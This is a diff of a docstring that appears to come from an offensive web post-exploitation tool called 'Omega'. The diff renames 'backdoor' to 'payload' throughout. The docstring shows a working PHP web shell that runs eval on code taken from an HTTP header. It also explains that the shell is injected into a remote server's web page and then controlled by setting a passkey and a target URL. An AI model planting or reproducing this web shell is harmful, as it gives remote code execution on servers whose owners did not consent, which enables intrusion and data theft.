@@ -21,11 +21,11 @@
 """
 HTTP Header to use as main Omega payload stager for RCE.
 
-PASSKEY is used by backdoor setting, and Omega http
+PASSKEY is used by payload setting, and Omega http
 tunnel mechanisms as the main payload stager & dispatcher.
 
 While exploiting a remote target with Omega, make sure
-passkey have the same value as the one it had when BACKDOOR
+passkey have the same value as the one it had when PAYLOAD
 had been generated.
 
 * AUTHENTICATION FEATURE:
@@ -33,15 +33,15 @@ It is recommended that you permanently change PASSKEY value
 to a custom value for authentication purposes.
 Indeed, having a custom PASSKEY value ensures that other
 Omega users will not be able to connect to your installed
-backdoor without the knowledge of it's value.
+payload without the knowledge of it's value.
 
 * EXAMPLE: Use a custom PASSKEY to prevent unauthorized access
 > set PASSKEY Custom123
 > exploit
-# [*] Current backdoor is: <?php @eval($_SERVER['HTTP_CUSTOM123']); ?>
-# To run a remote tunnel, the backdoor shown above must be
+# [*] Current payload is: <?php @eval($_SERVER['HTTP_CUSTOM123']); ?>
+# To run a remote tunnel, the payload shown above must be
 # manually injected in a remote server executable web page.
-# Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.
+# Then, use `set TARGET <PAYLOADED_URL>` and run `exploit`.
 """
 import re
 
